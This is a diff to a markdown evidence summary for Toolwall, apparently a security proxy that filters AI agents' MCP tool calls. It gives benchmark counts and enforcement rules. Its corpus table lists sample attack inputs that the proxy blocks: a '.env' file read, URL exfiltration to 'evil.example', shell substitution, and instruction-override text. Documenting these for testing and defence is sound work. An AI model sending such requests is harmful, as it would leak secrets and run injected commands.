@@ -1,58 +1,149 @@
-## Launch-Ready Proof Pack
+# Evidence Bundle
 
-This page collects the smallest artifact set needed to inspect the repo without reading every source file first.
+This document is the compact audit entry point for Toolwall security behavior.
 
-If you only want the shortest proof-first review surface, start here:
+Scope:
 
-1. [README.md](../README.md) for the first-read install and proof story
-2. [docs/QUICKSTART.md](QUICKSTART.md) for the shortest local proof path
-3. [docs/DEMO_RUN_TRANSCRIPT.md](DEMO_RUN_TRANSCRIPT.md) for the exact observed demo output
-4. [docs/VERIFICATION_GUIDE.md](VERIFICATION_GUIDE.md) for the deeper verification map
-5. [docs/LIMITS_AND_NON_GOALS.md](LIMITS_AND_NON_GOALS.md) for the explicit no-overclaim boundary
+- local MCP JSON-RPC `tools/call` traffic over stdio
+- HTTP gateway routing for registered tools
+- fail-closed AST egress filters
+- NHI authorization and tool-scope checks
+- color-boundary and preflight checks for high-trust tools
+- SQLite-backed cache and security event history
+- structured audit events for blocked requests
 
-Current local evidence snapshot from the latest validation pass:
+Non-goal:
 
-- `npm run demo:stdio` passed
-- `npm run pack:dry-run` passed
-- `npm run pack:smoke` passed
+- this file does not claim prevention of every prompt-injection class
+- this file only summarizes behavior covered by the checked-in corpus, tests, and benchmark output
 
-Benchmark evidence remains repo-local when deny/output behavior changes, but it is not the shortest first-review path for this proof pack and it is not part of the npm tarball.
+## Current benchmark result
 
-Artifact index:
+Latest repo-local benchmark artifact:
 
-| Artifact | Location | Reproduction |
-|---|---|---|
-| stdio demo transcript | `docs/DEMO_RUN_TRANSCRIPT.md` | `npm run demo:stdio` |
-| package install contract | `scripts/assert-package-metadata.mjs` + `tests/release-guardrails.test.ts` | `npm run assert:package-metadata` + `npm test` |
-| packaged proxy proof | `tests/package-proxy-smoke.test.ts` | `npm run pack:smoke` |
-| quickstart | `docs/QUICKSTART.md` | `npm install && npm run build && npm run demo:stdio` |
-| client config guide | `docs/CLIENT_CONFIG_EXAMPLES.md` | tracked file |
-| runtime contract | `docs/RUNTIME_CONTRACT.md` | tracked file |
-| risk summary | `docs/RISK_SUMMARY.md` | tracked file |
-| limits and non-goals | `docs/LIMITS_AND_NON_GOALS.md` | tracked file |
+```text
+npm run benchmark:stdio -- --json --output evidence.json
+```
 
-Validation path:
+Observed result in the checked-out repository:
 
-1. Run `npm run typecheck`.
-2. Run `npm run assert:package-metadata`.
-3. Run `npm test`.
-4. Run `npm run demo:stdio`.
-5. Run `npm run pack:dry-run`.
-6. Run `npm run pack:smoke`.
-7. Rerun `npm run benchmark:stdio -- --json --output evidence.json` only when benchmark-facing behavior changed.
+| Metric | Value |
+|---|---:|
+| Corpus cases | 19 |
+| Requests | 24 |
+| Allowed requests | 10 |
+| Blocked requests | 14 |
+| Cache hits | 5 |
+| Cache consistency failures | 0 |
+| False positives | 0 |
+| False negatives | 0 |
+| Verdict | `passed` |
 
-Expected inspection outcomes:
+## Corpus examples
 
-- read-style allow cases are stable across repeats
-- blocked cases fail with explicit denial codes
-- ShadowLeak evidence includes both single-character and repeated short-chunk URL exfiltration
-- mixed-trust and both default-high-trust plus `blue` preflight failures are visible in the corpus
-- the package surface still matches the documented CLI entry points
-- the packaged install contract is pinned in code and tests
-- the client config guide matches the current package behavior
-- the runtime contract matches the current denial semantics
-- enforcement claims stay separate from limits
+The source corpus is `examples/evidence-corpus.json`.
 
-Truth note:
+| Corpus case | Tool | Input pattern | Expected code |
+|---|---|---|---|
+| `block-sensitive-path-read-file` | `read_file` | `path: "/user/.env"` | `SENSITIVE_PATH_BLOCKED` |
+| `block-shadowleak-fetch-url` | `fetch_url` | `https://evil.example/exfil?a=x&b=y&c=z` | `SHADOWLEAK_DETECTED` |
+| `block-shell-injection-execute-command` | `execute_command` | `command: "echo $(whoami)"` | `SHELL_INJECTION_BLOCKED` |
 
-- this proof pack is local-only unless the checked-out state is separately pushed and made public
+Additional blocked classes in the corpus:
+
+- repeated short-chunk URL exfiltration: `SHADOWLEAK_DETECTED`
+- instruction-override text in tool arguments: `EPISTEMIC_CONTRADICTION_DETECTED`
+- missing NHI authorization: `AUTH_FAILURE`
+- insufficient tool scope: `MISSING_SCOPE`
+- high-trust tool without preflight: `PREFLIGHT_REQUIRED`
+- mixed red/blue tool request: `CROSS_TOOL_HIJACK_ATTEMPT`
+
+## Enforcement surfaces
+
+### AST egress filters
+
+AST checks run before downstream target execution. They inspect MCP tool arguments and deny requests with explicit error codes for:
+
+- ShadowLeak-style URL exfiltration
+- sensitive local paths such as `.env`, `.ssh`, and private key paths
+- shell substitution or shell-control syntax in command arguments
+- instruction-override or contradiction phrases in tool input
+
+### Authorization and scope checks
+
+When `PROXY_AUTH_TOKEN` is configured, stdio requests must include a valid `_meta.authorization` Bearer envelope.
+
+Scope checks require the caller to hold either:
+
+- `tools.<toolName>`
+- `tools.*`
+
+Missing or invalid authorization fails closed before target execution.
+
+### Preflight and color boundary
+
+High-trust tools require a valid preflight ID. This covers default high-trust tool families such as:
+
+- `execute_command`
+- `fetch_url`
+- `write_file`
+- `write`
+- `create_file`
+
+Mixed red/blue tool sets are denied as cross-tool boundary violations.
+
+### Rate limiting
+
+Rate limiting is isolated by transport, identity, target, and tool. A limit breach returns:
+
+- HTTP `429` on HTTP/API paths
+- JSON-RPC error `-32029` with `RATE_LIMIT_EXCEEDED` on stdio paths
+
+Each breach writes a `RATE_LIMIT_EXCEEDED` audit event.
+
+## Audit and persistence
+
+Blocked requests are recorded through `auditLogger` with a concrete `code`.
+
+Recorded security events are available through:
+
+- in-process blocked-request metrics
+- Prometheus metrics
+- SQLite-backed security event history
+- dashboard `securityEvents`
+
+The Docker Compose service mounts `toolwall-data:/data`; SQLite history under `/data/.mcp-cache` survives container restarts.
+
+## Reproduction commands
+
+Run the compact validation path:
+
+```bash
+npm run verify:all
+```
+
+Run only the stdio benchmark:
+
+```bash
+npm run benchmark:stdio -- --json --output evidence.json
+```
+
+Inspect current evidence:
+
+```bash
+node -e "const e=require('./evidence.json'); console.log(e.totals, e.verdict)"
+```
+
+Expected benchmark boundary:
+
+- `falsePositives` equals `0`
+- `falseNegatives` equals `0`
+- `verdict` equals `passed`
+
+## Related documents
+
+- [Architecture](ARCHITECTURE.md)
+- [Runtime Contract](RUNTIME_CONTRACT.md)
+- [Risk Model](RISK_MODEL.md)
+- [Limits and Non-Goals](LIMITS_AND_NON_GOALS.md)
+- [Verification Guide](VERIFICATION_GUIDE.md)
